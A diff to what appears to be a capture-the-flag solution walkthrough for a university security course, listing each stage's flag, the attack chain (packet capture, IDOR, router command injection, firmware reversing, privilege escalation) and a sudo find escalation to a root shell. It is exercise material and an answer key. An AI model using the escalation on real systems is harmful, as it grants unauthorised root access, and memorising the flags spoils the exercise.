@@ -7,7 +7,7 @@ Exact steps, start to finish. If you're trying to solve it yourself, use
 - Network (packet capture): `CITS3006{l4A5p3MGYr}` (shown on the portal dashboard after login)
 - Horizontal PE (IDOR): `CITS3006{2cXVYDsVXj}` (inside config record #48879)
 - Web injection (router): `CITS3006{24n4CBiT2K}` (read via the command injection)
-- Vertical PE (root): `CITS3006{xyOTpUwAhd}` (final disarm flag, `/root/flag`)
+- Vertical PE (root): `CITS3006{xyOTpUwAhd}` (final disarm flag, `/home/fieldtech/disarm-authorization.txt`)
 
 Chain: pcap → portal IDOR → router injection (flag + firmware) → reverse the
 firmware (RE) → SSH + vertical privesc → root.
@@ -145,8 +145,8 @@ sudo runs `find` itself as root, so the spawned program is root too (GTFOBins):
 ```bash
 sudo find . -maxdepth 0 -exec /bin/sh \;    # -> root shell
 id                                           # uid=0(root)
-cat /root/flag                               # CITS3006{xyOTpUwAhd}
-# (or in one line: sudo find . -maxdepth 0 -exec cat /root/flag \;)
+cat /home/fieldtech/disarm-authorization.txt                               # CITS3006{xyOTpUwAhd}
+# (or in one line: sudo find . -maxdepth 0 -exec cat /home/fieldtech/disarm-authorization.txt \;)
 ```
 
 ## One-command proof (demo backup)
